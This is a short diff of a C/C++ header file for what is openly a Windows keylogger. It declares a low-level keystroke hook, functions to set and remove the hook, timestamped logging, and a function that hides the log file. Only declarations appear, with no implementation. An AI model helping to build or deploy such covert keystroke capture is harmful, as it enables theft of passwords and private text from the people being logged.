@@ -6,13 +6,14 @@
 // Keylogging hook that logs low level keystrokes
 LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam);
 
-// Sets the keylogging hook
-int setupHook();
+int setKeylogHook();
 
-// Removes the keylogging hook
-int removeHook();
+void writeTimestampToLogFile();
 
-// Opens log file for appending, inserts timestamp, and hides the file
+void hideLogFile();
+
 void initLogFile();
+
+int removeKeylogHook();
 
 #endif
